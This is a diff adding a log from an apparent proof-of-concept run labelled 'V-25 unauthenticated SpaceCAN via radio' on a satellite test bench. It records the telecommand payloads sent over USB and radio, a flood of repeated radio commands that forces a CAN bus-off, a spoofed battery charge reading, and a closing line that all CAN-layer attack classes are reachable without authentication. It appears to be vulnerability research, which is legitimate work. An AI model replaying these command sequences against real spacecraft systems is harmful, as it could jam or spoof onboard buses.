@@ -1,0 +1,141 @@
+[   0.000] ========================================================================
+[   0.000] V-25 unauthenticated SpaceCAN via radio
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.855] --> TC apid=0x0A via=usb AES  payload=00
+[   8.907] <-- TM apid=0x0A clear len=3
+[   8.949] --> TC apid=0x1D via=usb clear payload=0101
+[   9.000] <-- TM apid=0x1D clear len=4
+[   9.001] --> TC apid=0x11 via=usb clear payload=00
+[   9.462] <-- TM apid=0x11 clear len=9
+[   9.462] --> TC apid=0x15 via=usb clear payload=001005
+[   9.912] <-- TM apid=0x15 clear len=6
+[   9.912] --> TC apid=0x0D via=usb clear payload=01
+[  10.372] <-- TM apid=0x0D clear len=4
+[  10.414] --> TC apid=0x1D via=usb clear payload=03
+[  10.466] <-- TM apid=0x1D clear len=4
+[  10.466] <-- TM apid=0x09 clear len=9
+[  10.518] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.559] <-- TM apid=0x1D clear len=4
+[  10.559] --> TC apid=0x10 via=usb clear payload=00
+[  10.611] <-- TM apid=0x10 clear len=4
+[  10.611] --> TC apid=0x21 via=usb clear payload=00
+[  11.072] <-- TM apid=0x21 clear len=6
+[  11.072] --> TC apid=0x24 via=usb clear payload=0000
+[  11.113] <-- TM apid=0x24 clear len=8
+[  11.113] --> TC apid=0x24 via=usb clear payload=0100
+[  11.165] <-- TM apid=0x24 clear len=8
+[  11.165] --> TC apid=0x24 via=usb clear payload=0200
+[  11.217] <-- TM apid=0x24 clear len=8
+[  11.217] --> TC apid=0x24 via=usb clear payload=0300
+[  11.269] <-- TM apid=0x24 clear len=8
+[  11.269] --> TC apid=0x25 via=usb clear payload=0080
+[  11.320] <-- TM apid=0x25 clear len=4
+[  11.320] --> TC apid=0x1E via=usb clear payload=01
+[  11.823] <-- TM apid=0x1E clear len=5
+[  11.823] --> TC apid=0x1D via=usb clear payload=0b
+[  11.926] <-- TM apid=0x1D clear len=4
+[  11.926] --> TC apid=0x05 via=usb clear payload=12
+[  12.384] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.885] <-- TM apid=0x1F clear len=4
+[  12.885] --> TC apid=0x1F via=usb clear payload=05
+[  13.387] <-- TM apid=0x1F clear len=4
+[  13.387] --> TC apid=0x0A via=usb clear payload=01
+[  13.432] <-- TM apid=0x0A AES len=3
+[  21.520] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.001] <-- TM apid=0x0E AES len=18
+[  30.001] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.073] --> TC apid=0x04 via=usb AES  payload=0000
+[  34.075] --> TC apid=0x0C via=usb AES  payload=-
+[  34.099] <-- TM apid=0x0C AES len=27
+[  34.099] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  34.550] <-- TM apid=0x1C clear len=8
+[  34.602] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  35.052] <-- TM apid=0x1C clear len=8
+[  35.104] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  35.565] <-- TM apid=0x1C clear len=8
+[  35.607] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  36.068] <-- TM apid=0x1C clear len=8
+[  36.110] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  36.571] <-- TM apid=0x1C clear len=8
+[  36.613] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  37.073] <-- TM apid=0x1C clear len=8
+[  37.115] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  37.573] <-- TM apid=0x1C clear len=8
+[  37.614] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  38.074] <-- TM apid=0x1C clear len=8
+[  38.116] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  38.577] <-- TM apid=0x1C clear len=8
+[  38.618] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  39.079] <-- TM apid=0x1C clear len=8
+[  39.120] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  39.581] <-- TM apid=0x1C clear len=8
+[  39.623] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  40.083] <-- TM apid=0x1C clear len=8
+[  40.125] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  40.586] <-- TM apid=0x1C clear len=8
+[  40.628] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  41.089] <-- TM apid=0x1C clear len=8
+[  41.131] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  41.592] <-- TM apid=0x1C clear len=8
+[  41.634] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  42.094] <-- TM apid=0x1C clear len=8
+[  42.135] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  42.593] <-- TM apid=0x1C clear len=8
+[  42.645] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  43.106] <-- TM apid=0x1C clear len=8
+[  43.147] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  43.608] <-- TM apid=0x1C clear len=8
+[  43.650] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  44.111] <-- TM apid=0x1C clear len=8
+[  44.153] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  44.614] <-- TM apid=0x1C clear len=8
+[  44.656] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  45.116] <-- TM apid=0x1C clear len=8
+[  45.158] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  45.619] <-- TM apid=0x1C clear len=8
+[  45.661] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  46.122] <-- TM apid=0x1C clear len=8
+[  46.164] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  46.625] <-- TM apid=0x1C clear len=8
+[  46.667] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  47.128] <-- TM apid=0x1C clear len=8
+[  47.169] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  47.630] <-- TM apid=0x1C clear len=8
+[  47.672] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  48.131] <-- TM apid=0x1C clear len=8
+[  48.173] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  48.634] <-- TM apid=0x1C clear len=8
+[  48.675] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  49.136] <-- TM apid=0x1C clear len=8
+[  49.178] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  49.639] <-- TM apid=0x1C clear len=8
+[  49.681] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[  50.141] <-- TM apid=0x1C clear len=8
+[  50.183] --> TC apid=0x1C via=radio AES  payload=000000028402017b
+[  50.644] <-- TM apid=0x1C clear len=8
+[  50.644] after junk storm: busoff mask=0x01 err=0
+[  50.686] --> TC apid=0x0C via=usb AES  payload=-
+[  50.741] <-- TM apid=0x0C AES len=27
+[  50.741] --> TC apid=0x1C via=radio AES  payload=030000028400
+[  51.202] <-- TM apid=0x1C clear len=8
+[  51.243] --> TC apid=0x1C via=radio AES  payload=000000028402017b
+[  51.704] <-- TM apid=0x1C clear len=8
+[  51.746] --> TC apid=0x0C via=usb AES  payload=-
+[  51.801] <-- TM apid=0x0C AES len=27
+[  51.801] --> TC apid=0x1C via=radio AES  payload=0000000287020105
+[  52.252] <-- TM apid=0x1C clear len=8
+[  52.252] --> advance(500 ms)
+[  52.805] <-- TM apid=0x27 clear len=4
+[  52.846] --> TC apid=0x1D via=usb clear payload=00
+[  52.897] <-- TM apid=0x1D clear len=18
+[  52.898] spoofed charge=5 -> bus=21.14 V safe=1
+[  52.949] --> TC apid=0x1C via=radio clear payload=013c
+[  53.408] <-- TM apid=0x1C clear len=8
+[  53.450] --> TC apid=0x1C via=radio clear payload=04
+[  53.911] <-- TM apid=0x1C clear len=8
+[  53.911] => every CAN-layer attack class (jam/spoof/replay/overflow) is reachable from the raw radio, unauthenticated
+[  53.911] -- console tail: [TC - SPP] APID=0x00C SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01C SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01D SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=15 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01C SEQ=1 LEN=2 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=14 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01C SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO
+[  53.911] ========================================================================
+[  53.911] POC OK
+[  53.911] ========================================================================
